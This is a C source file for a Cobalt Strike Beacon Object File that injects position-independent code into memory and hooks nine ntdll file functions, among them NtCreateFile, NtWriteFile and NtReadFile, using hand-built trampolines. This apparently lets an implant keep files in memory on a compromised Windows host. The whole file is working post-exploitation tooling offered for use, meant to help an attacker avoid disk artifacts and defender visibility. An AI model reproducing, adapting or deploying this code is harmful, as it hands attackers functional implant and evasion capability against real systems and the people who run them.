#include "bofdefs.h"
#include "beacon.h"

struct FileInfo *pFileInfo = NULL;

void patchAddr(char** buffer, int buflen)
{
	//We are going to locate the "AAAAAAAAAAAAAAAA" string variable in each PIC function and place it with the 8-byte address of the pFileInfo struct
	char holder[20] = { 0 };
	sprintf_s(holder, 20, "%p", pFileInfo);

	char placeholder[] = { 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41 }; 
	for(int i = 0; i < buflen; i++)
	{
		if(memcmp(*buffer + i, placeholder, 16) == 0)
		{
			memcpy(*buffer + i, holder, 16);
			break;
		}
	}
	return;
}

LPVOID hookNtFunction(char* ntfunction, void** ntfunctionHookAddr, LPVOID *trampoline, LPVOID *origbytes, BOOL write)
{
	//Install hook
	char ntreadbytes[33] = { 0 };
	char nttrampoline[32] = { 0 };
	SIZE_T bytesRead = 0;
	SIZE_T bytesWritten = 0;

	//Get address of NtFunction
	LPVOID ntfunctionAddr = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), ntfunction);

	/*
	* Read 32 bytes from NtFunction address.
	* NtFunction format changed on Windows between Win7 and Win 10
	* Early versions each Nt function is 16 bytes
	* Later versions each Nt function is 32 bytes
	* We have to read 32 and then determine which version we are working with and then act accordingly.
	*
	* Win7
	* ntdll!ZwCreateFile:
	* 00000000`77949dd0 4c8bd1          mov     r10,rcx
	* 00000000`77949dd3 b852000000      mov     eax,52h
	* 00000000`77949dd8 0f05            syscall
	* 00000000`77949dda c3              ret
	* 00000000`77949ddb 0f1f440000      nop     dword ptr [rax+rax]
	*
	* Win10
	* ntdll!NtCreateFile:
	* 00007ffd`d4c4db50 4c8bd1          mov     r10,rcx
	* 00007ffd`d4c4db53 b855000000      mov     eax,55h
	* 00007ffd`d4c4db58 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
	* 00007ffd`d4c4db60 7503            jne     ntdll!NtCreateFile+0x15 (00007ffd`d4c4db65)
	* 00007ffd`d4c4db62 0f05            syscall
	* 00007ffd`d4c4db64 c3              ret
	* 00007ffd`d4c4db65 cd2e            int     2Eh
	* 00007ffd`d4c4db67 c3              ret
	* 00007ffd`d4c4db68 0f1f840000000000 nop     dword ptr [rax+rax]
	*/

	//Read entire NtFunction into buffer
	ReadProcessMemory(GetCurrentProcess(), ntfunctionAddr, ntreadbytes, 32, &bytesRead);

	//Need to determine if we are dealing with old or new syscall format; look for syscall location
	//If syscall found at 9th and 10th bytes in Nt function, on old version with 16 byte length
	BOOL bOldSyscallFormat = FALSE;
	if (ntreadbytes[8] == 0x0f && ntreadbytes[9] == 0x05)
		bOldSyscallFormat = TRUE;

	/*
	* We need to overwrite the first instructions with a jmp to our custom function/code
	* RAX ends up holding the syscall number (52h/55h above), so we can use this register as long as is holds the syscall number before we make the syscall
	* Note that we must eventually perform every instruction in the NtFunction; anything we overwrite with our hook will need to be executed later
	*/

	//Save off the original bytes of the NtFunction for restoration later
	//Note that in both old & new format we are only overwriting 16 bytes with our hook
	*origbytes = calloc(17, sizeof(char));
	memcpy(*origbytes, ntreadbytes, 16);
                      
	if (bOldSyscallFormat)
	{
		/*
		* We need to assemble our trampoline that is executed at the end of all calls to our hooked NtFunctions that we do NOT want to alter/spoof
		* We need to copy the instructions that we overwrite with our original hook into the trampoline as well as a jmp back to our NtFunction at the proper address
		* 
		* Copy first 8 bytes of the NtFunction we read which contain:
		* mov r10,rcx 
		* mov eax,<num> 
		*/
		memcpy(&nttrampoline[0], &ntreadbytes[0], 8);

		//Now need a push RAX instruction in order to save the syscall number on the stack so we can use RAX to jmp back to our NtFunction
		char pusheax[] = { 0x50 };
		memcpy(&nttrampoline[8], &pusheax[0], 1);

		//Now that we have set up our registers properly want to make the syscall, but we want to do so from within NTDLL. 
		//Going to make a jump back to the NtFunction at the pop RAX instruction we write there as part of our hook

		//pop rax is 12 bytes from original Nt function address
		char* jumpbackaddr = (char*)ntfunctionAddr + (12 * sizeof(char));

		/*
		* We need to assemble the bytes we will use to jmp back to our NtFunction at the proper location
		* mov RAX, < 8 byte address to jump to >
		* jmp RAX
		*/
		char jumpbackbytes[] = { 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0 };

		//Create jump by patching in address of syscall
		memcpy(&jumpbackbytes[2], &jumpbackaddr, 8);

		//Assemble final trampoline by patching in jumpbackbytes after original NtFunction bytes
		memcpy(&nttrampoline[9], &jumpbackbytes[0], 12);

		//Allocate and write trampoline as R/W memory
		*trampoline = VirtualAlloc(NULL, 21, MEM_COMMIT, PAGE_READWRITE);
		WriteProcessMemory(GetCurrentProcess(), (LPVOID)*trampoline, &nttrampoline, 21, &bytesWritten);

		//Change memory protections so trampoline can be executed
		DWORD dwOldProtect;
		VirtualProtect(*trampoline, 21, PAGE_EXECUTE_READ, &dwOldProtect);

		/*
		* Finished trampoline
		*
		* 000001E80D530000 | 4C:8BD1                      | MOV R10, RCX                            # Original NtFunction instruction
		* 000001E80D530003 | B8 0F000000                  | MOV EAX, F                              # Move syscall number into RAX
		* 000001E80D530008 | 50                           | PUSH RAX                                # Save syscall number on stack
		* 000001E80D530009 | 48:B8 5F3D3E9AFC7F0000       | MOV RAX, ntdll.7FFC9A3E3D5F             # Move the address we want to jmp to in NtFunction into RAX
		* 000001E80D530013 | FFE0                         | JMP RAX                                 # Jmp to NtFunction
		*
		* Assemble NtFunction hook
		* The patch that we write into the actual Nt function can use RAX to jump to our hook function
		*/

		char hookBytes[] = {0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0, 0x58, 0x0f, 0x05, 0xc3};

		//Finalize patch by copying in the address of the proper ntfunctionHook address
		memcpy(&hookBytes[2], ntfunctionHookAddr, 8);

		//Patch original Nt API in ntdll.dll
		WriteProcessMemory(GetCurrentProcess(), (LPVOID)ntfunctionAddr, hookBytes, 16, &bytesWritten);

		/*
		* Final state of hooked NtFunction:
		* 
		* ntdll!NtCreateFile:
		* 0000000077949DD0 | 48:B8 00001C0000000000       | MOV RAX,1C0000h       				    # Move address of our custom function into RAX                               
		* 0000000077949DDA | FFE0                         | JMP RAX                                 # Jump to our custom function
		* 0000000077949DDC | 58                           | POP RAX                                 # Restore the syscall number to RAX from the stack
		* 0000000077949DDD | 0F05                         | SYSCALL                                 # Issue syscall                            
        * 0000000077949DDF | C3                           | RET                                     # Return to caller of NtFunction                           
		*/
	}

	//Otherwise we are on new version with 32 byte length
	else
	{
		/*
		* We need to assemble our trampoline that is executed at the end of all calls to our hooked NtFunctions that we do NOT want to alter/spoof
		* We need to copy the instructions that we overwrite with our original hook into the trampoline as well as a jmp back to our NtFunction at the proper address
		* 
		* Copy first 16 bytes of the NtFunction we read which contain:
		* mov r10,rcx 
		* mov eax,<num> 
		* test byte ptr ds:[7FFE0308], 1 
		*/
		memcpy(&nttrampoline[0], &ntreadbytes[0], 16);

		//Now need a push RAX instruction in order to save the syscall number on the stack so we can use RAX to jmp back to our NtFunction
		char pusheax[] = { 0x50 };
		memcpy(&nttrampoline[16], &pusheax[0], 1);

		//Now that we have set up our registers properly set up we want to make the syscall, but we want to do so from within NTDLL. 
		//Going to make a jump back to the NtFunction at the pop RAX instruction we wrote there as part of our hook

		//pop rax is 15 bytes from original Nt function address
		char* jumpbackaddr = (char*)ntfunctionAddr + (15 * sizeof(char));

		/*
		* We need to assemble the bytes we will use to jmp back to our NtFunction at the proper location
		* mov RAX, < 8 byte address to jump to >
		* jmp RAX
		*/ 
		char jumpbackbytes[] = { 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0 };

		//Create jump by patching in address of syscall
		memcpy(&jumpbackbytes[2], &jumpbackaddr, 8);

		//Assemble final trampoline by patching in jumpbackbytes after original NtFunction bytes
		memcpy(&nttrampoline[17], &jumpbackbytes[0], 12);

		//Allocate and write trampoline as executable memory
		*trampoline = VirtualAlloc(NULL, 29, MEM_COMMIT, PAGE_READWRITE);
		WriteProcessMemory(GetCurrentProcess(), (LPVOID)*trampoline, &nttrampoline, 29, &bytesWritten);

		//Change memory protections so trampoline can be executed
		DWORD dwOldProtect;
		VirtualProtect(*trampoline, 29, PAGE_EXECUTE_READ, &dwOldProtect);

		/*
		* Finished trampoline
		*
		* 000001E80D530000 | 4C:8BD1                      | MOV R10, RCX                            # Original NtFunction instruction
		* 000001E80D530003 | B8 0F000000                  | MOV EAX, F                              # Move syscall number into RAX
		* 000001E80D530008 | F60425 0803FE7F 01           | TEST BYTE PTR DS:[7FFE0308], 1          # Test to see if we use syscall or int 2e -> sets ZF flag
		* 000001E80D530010 | 50                           | PUSH RAX                                # Save syscall number on stack
		* 000001E80D530011 | 48:B8 5F3D3E9AFC7F0000       | MOV RAX, ntdll.7FFC9A3E3D5F             # Move the address we want to jmp to in NtFunction into RAX
		* 000001E80D53001B | FFE0                         | JMP RAX                                 # Jmp to NtFunction
		*
		* Assemble NtFunction hook
		* The patch that we write into the actual Nt function can use RAX to jump to our hook function
		* Note that doing so destroys the TEST instruction, which will be placed in our trampoline
		*/

		char hookBytes[] = {0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0, 0x90, 0x90, 0x90, 0x58};

		//Finalize patch by copying in the address of the proper ntfunctionHook address
		memcpy(&hookBytes[2], ntfunctionHookAddr, 8);

		//Patch original Nt API in ntdll.dll
		WriteProcessMemory(GetCurrentProcess(), (LPVOID)ntfunctionAddr, hookBytes, 16, &bytesWritten);

		/*
		* Final state of hooked NtFunction:
		* 
		* ntdll!NtCreateFile:
		* 00007FFC9A3E3D50 | 48:B8 000003C8AA010000       | MOV RAX, 1AAC8030000       				# Move address of our custom function into RAX                               
		* 00007FFC9A3E3D5A | FFE0                         | JMP RAX                                 # Jump to our custom function
		* 00007FFC9A3E3D5C | 90                           | NOP                                                       
		* 00007FFC9A3E3D5D | 90                           | NOP                                                       
		* 00007FFC9A3E3D5E | 90                           | NOP                                                       
		* 00007FFC9A3E3D5F | 58                           | POP RAX                                 # Restore the syscall number to RAX from the stack
		* 00007FFC9A3E3D60 | 75 03                        | JNE ntdll.7FFC9A3E3D65                  # If test instruction in trampoline resulted in ZF = 1, jmp to int 2e instruction
		* 00007FFC9A3E3D62 | 0F05                         | SYSCALL                                 # Issue syscall
		* 00007FFC9A3E3D64 | C3                           | RET                                     # Return to caller of NtFunction   
		* 00007FFC9A3E3D65 | CD 2E                        | INT 2E                                  # Alternate syscall instruction
		* 00007FFC9A3E3D67 | C3                           | RET                                     # Return to caller of NtFunction                   
		* 00007FFC9A3E3D68 | 0F1F8400 00000000            | NOP DWORD PTR DS:[RAX + RAX], EAX       # ???
		*/
	}
  
  //This left in for debugging purposes later
    if(write)
        ;
    else
		__debugbreak();

}

void inject(char* pic, int picLen, void*** pPICAddr)
{
    //Allocate space for PIC
    LPVOID Addr = VirtualAlloc(NULL, picLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    //Write PIC into memory
    memcpy(Addr, pic, picLen);

	//Change memory protections to RX
	DWORD dwOldProtect;
	VirtualProtect(Addr, 29, PAGE_EXECUTE_READ, &dwOldProtect);

	//Create a pointer to our injected function
    *pPICAddr = malloc((1 * sizeof(LPVOID)) + 1);
    memcpy(*pPICAddr, &Addr, (1 * sizeof(LPVOID)));
}

int go(IN PCHAR Buffer, IN ULONG Length) 
{
	//Create struct and initialize a few values
	pFileInfo = malloc(sizeof(struct FileInfo));
	memset(pFileInfo, 0, sizeof(struct FileInfo));
	pFileInfo->numFiles = 0;
	pFileInfo->totalFiles = 0;

	//Save struct on the Key/Value store
	if (!BeaconAddValue(MF_FILE_INFO_KEY, pFileInfo))
	{
		BeaconPrintf(CALLBACK_ERROR, "failed to call BeaconAddValue");
		return 0;
	}

	BeaconPrintf(CALLBACK_OUTPUT, "memfiles initialized");

	datap parser;
	BeaconDataParse(&parser, Buffer, Length);
    
	//Extract the PIC exe's
	char* ntcreatefilebytes = BeaconDataExtract(&parser, &pFileInfo->PICNtCreateFileLen);
    char* ntwritefilebytes = BeaconDataExtract(&parser, &pFileInfo->PICNtWriteFileLen);
    char* ntclosebytes = BeaconDataExtract(&parser, &pFileInfo->PICNtCloseLen);
	char* ntqueryvolumeinformationfilebytes = BeaconDataExtract(&parser, &pFileInfo->PICNtQueryVolumeInformationFileLen);
	char* ntqueryinformationfilebytes = BeaconDataExtract(&parser, &pFileInfo->PICNtQueryInformationFileLen);
	char* ntsetinformationfilebytes = BeaconDataExtract(&parser, &pFileInfo->PICNtSetInformationFileLen);
	char* ntreadfilebytes = BeaconDataExtract(&parser, &pFileInfo->PICNtReadFileLen);
	char* ntopenfilebytes = BeaconDataExtract(&parser, &pFileInfo->PICNtOpenFileLen);
	char* ntflushbuffersfilebytes = BeaconDataExtract(&parser, &pFileInfo->PICNtFlushBuffersFileLen);

	//Patch the struct address into the compiled PIC exe custom functions
	//patchAddr prototype: void patchAddr(char** buffer, int buflen)
	patchAddr(&ntcreatefilebytes, pFileInfo->PICNtCreateFileLen);
	patchAddr(&ntwritefilebytes, pFileInfo->PICNtWriteFileLen);
	patchAddr(&ntclosebytes, pFileInfo->PICNtCloseLen);
	patchAddr(&ntqueryvolumeinformationfilebytes, pFileInfo->PICNtQueryVolumeInformationFileLen);
	patchAddr(&ntqueryinformationfilebytes, pFileInfo->PICNtQueryInformationFileLen);
	patchAddr(&ntsetinformationfilebytes, pFileInfo->PICNtSetInformationFileLen);
	patchAddr(&ntreadfilebytes, pFileInfo->PICNtReadFileLen);
	patchAddr(&ntopenfilebytes, pFileInfo->PICNtOpenFileLen);
	patchAddr(&ntflushbuffersfilebytes, pFileInfo->PICNtFlushBuffersFileLen);

	//Inject PIC into memory
	//inject prototype: void inject(char* pic, int picLen, void*** pPICAddr)
	inject(ntcreatefilebytes, pFileInfo->PICNtCreateFileLen, &pFileInfo->PICNtCreateFile);
	inject(ntwritefilebytes, pFileInfo->PICNtWriteFileLen, &pFileInfo->PICNtWriteFile);
	inject(ntclosebytes, pFileInfo->PICNtCloseLen, &pFileInfo->PICNtClose); 
	inject(ntqueryvolumeinformationfilebytes, pFileInfo->PICNtQueryVolumeInformationFileLen, &pFileInfo->PICNtQueryVolumeInformationFile);
	inject(ntqueryinformationfilebytes, pFileInfo->PICNtQueryInformationFileLen, &pFileInfo->PICNtQueryInformationFile); 
	inject(ntsetinformationfilebytes, pFileInfo->PICNtSetInformationFileLen, &pFileInfo->PICNtSetInformationFile); 
	inject(ntreadfilebytes, pFileInfo->PICNtReadFileLen, &pFileInfo->PICNtReadFile);
	inject(ntopenfilebytes, pFileInfo->PICNtOpenFileLen, &pFileInfo->PICNtOpenFile);
	inject(ntflushbuffersfilebytes, pFileInfo->PICNtFlushBuffersFileLen, &pFileInfo->PICNtFlushBuffersFile);

	//Hook NtFunctions
	//hookNtfunction prototype: LPVOID hookNtFunction(char* ntfunction, void** ntfunctionHookAddr, LPVOID *trampoline, LPVOID *origbytes, BOOL write)
	hookNtFunction("NtCreateFile", pFileInfo->PICNtCreateFile, &pFileInfo->NtCreateFiletrampoline, &pFileInfo->NtCreateFileorigbytes, TRUE);
	hookNtFunction("NtWriteFile", pFileInfo->PICNtWriteFile, &pFileInfo->NtWriteFiletrampoline, &pFileInfo->NtWriteFileorigbytes, TRUE);
	hookNtFunction("NtClose", pFileInfo->PICNtClose, &pFileInfo->NtClosetrampoline, &pFileInfo->NtCloseorigbytes, TRUE);
	hookNtFunction("NtQueryVolumeInformationFile", pFileInfo->PICNtQueryVolumeInformationFile, &pFileInfo->NtQueryVolumeInformationFiletrampoline, &pFileInfo->NtQueryVolumeInformationFileorigbytes, TRUE);
	hookNtFunction("NtQueryInformationFile", pFileInfo->PICNtQueryInformationFile, &pFileInfo->NtQueryInformationFiletrampoline, &pFileInfo->NtQueryInformationFileorigbytes, TRUE);
	hookNtFunction("NtSetInformationFile", pFileInfo->PICNtSetInformationFile, &pFileInfo->NtSetInformationFiletrampoline, &pFileInfo->NtSetInformationFileorigbytes, TRUE);
	hookNtFunction("NtReadFile", pFileInfo->PICNtReadFile, &pFileInfo->NtReadFiletrampoline, &pFileInfo->NtReadFileorigbytes, TRUE);
	hookNtFunction("NtOpenFile", pFileInfo->PICNtOpenFile, &pFileInfo->NtOpenFiletrampoline, &pFileInfo->NtOpenFileorigbytes, TRUE);
	hookNtFunction("NtFlushBuffersFile", pFileInfo->PICNtFlushBuffersFile, &pFileInfo->NtFlushBuffersFiletrampoline, &pFileInfo->NtFlushBuffersFileorigbytes, TRUE);

	return 0;
}